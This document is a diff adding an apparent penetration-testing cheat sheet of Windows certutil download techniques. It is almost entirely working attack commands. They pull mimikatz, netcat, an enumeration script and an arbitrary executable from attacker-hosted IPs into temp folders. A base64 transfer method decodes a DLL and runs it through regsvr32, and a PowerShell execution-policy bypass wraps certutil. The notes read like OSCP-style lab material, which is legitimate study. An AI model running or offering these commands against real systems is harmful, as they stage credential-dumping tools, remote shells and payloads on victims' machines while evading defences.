@@ -1,1 +1,20 @@
+certutil -urlcache -split -f http://192.168.45.x:443/mimikatz.exe
+certutil.exe -urlcache -split -f http://192.168.45.x:8000/umbra6666.exe C:\windows\temp\umbra6666.exe  
 
+certutil: Transfer encoded / decode
+   On kali, convert file to base64
+        base64 dll.txt
+
+    Run webserver
+        python -m SimpleHTTPServer 8088
+
+    On windows
+        certutil.exe -urlcache -split -f http://192.168.1.x:8088/dll.txt dll.txt certutil.exe -decode .\dll.txt mydll.dll regsvr32 /s /u mydll.dll
+         certutil.exe -urlcache -split -f http://192.168.1.x:8088/dll.txt dll.txt certutil.exe -decode .\dll.txt mydll.dll regsvr32 /s /u mydll.dll
+
+    On windows no encryption
+        certutil.exe -urlcache -split -f http://10.10.14.x:8088/nc.exe C:\Users\Public\Downloadsnc.exe
+        certutil.exe -urlcache -split -f http://192.168.x.134:80/jaws-enum.ps1 C:\windows\temp\jaws-enum.ps1 
+
+Powershell  certutil
+$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.119.x:80/file.txt}"
